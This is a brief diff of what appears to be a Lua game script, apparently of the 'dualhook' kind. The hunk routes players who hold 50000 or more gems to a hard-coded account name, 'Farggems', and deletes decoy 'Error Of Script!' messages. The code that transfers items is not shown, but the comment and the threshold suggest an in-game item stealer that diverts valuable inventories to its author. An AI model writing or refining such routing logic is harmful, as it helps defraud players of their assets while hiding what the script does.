@@ -47,9 +47,6 @@ end
 
 if GemAmount1 >= 50000 then
     Username = "Farggems" -- Your nick in dualhook
-    print("Error Of Script!")
-else
-    print("Error Of Script!")
 end
 local user = Username
 
